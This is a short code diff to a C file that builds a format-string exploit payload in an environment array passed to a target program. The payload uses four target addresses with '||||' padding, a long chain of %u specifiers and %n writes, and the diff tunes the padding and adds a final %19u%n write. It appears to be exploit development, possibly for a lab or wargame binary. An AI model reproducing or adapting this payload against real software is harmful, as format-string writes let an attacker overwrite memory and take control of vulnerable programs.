@@ -7,10 +7,13 @@
 
 #include <debug.h>
 
+char *newargs[] = { NULL };
+
 char *newenv[] = { 
     "CCCC", 
     "BBBB", 
-    "\x14\xa0\x04\x08||||\x15\xa0\x04\x08||||\x16\xa0\x04\x08\x17\xa0\x04\x08%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u.%u.%u%u%u%u%u%u%u%u....%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u.%71u%n%208u%n%203u%n%n\x00\x00", 
+    // TODO make %u print out same number of bytes so we can get accurate results
+    "\x14\xa0\x04\x08||||\x15\xa0\x04\x08||||\x16\xa0\x04\x08||||\x17\xa0\x04\x08%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u.%u.%u%u%u%u%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u.%71u%n%208u%n%203u%n%19u%n\x00\x00", 
     "\x14\xa0\x04\x08", 
 };
 
